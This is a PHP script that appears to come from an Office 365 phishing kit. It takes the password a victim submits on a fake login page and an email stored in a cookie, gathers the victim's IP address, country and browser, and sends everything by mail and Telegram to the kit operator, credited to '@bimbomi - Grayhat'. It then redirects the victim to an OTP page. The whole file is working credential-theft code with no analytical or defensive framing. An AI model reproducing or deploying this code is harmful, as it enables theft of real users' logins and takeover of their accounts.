<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/geo.php';
require_once __DIR__ . '/cookies.php';
include_once __DIR__ . '/me.php';

$pw    = $_POST['password'] ?? '';
$email = $_COOKIE['email'] ?? 'unknown';
if ($pw === '') { header('Location: index3.html'); exit; }

$ip = visitor_ip();

$message  = "⭐️O365 RESULTS⭐️\n\n";
$message .= "|--------------[LOGIN INFO💻]----------------|\n\n";
$message .= "Email: {$email}\n";
$message .= "2nd Password: {$pw}\n\n";
$message .= "|--------------[IP INFO📍]----------------|\n\n";
$message .= "User-IP: {$ip}\n";
$message .= "Country: " . visitor_country($ip) . "\n";
$message .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . "\n";
$message .= "Date: " . date('D M d, Y g:i a') . "\n\n";
$message .= "| Author✍️: @bimbomi - Grayhat |\n";

@mail($send, '**NEW OFFICE365 RESULTS**', $message, "From: Grayhat");
send_telegram_msg($message);

header('Location: otp.html');
exit;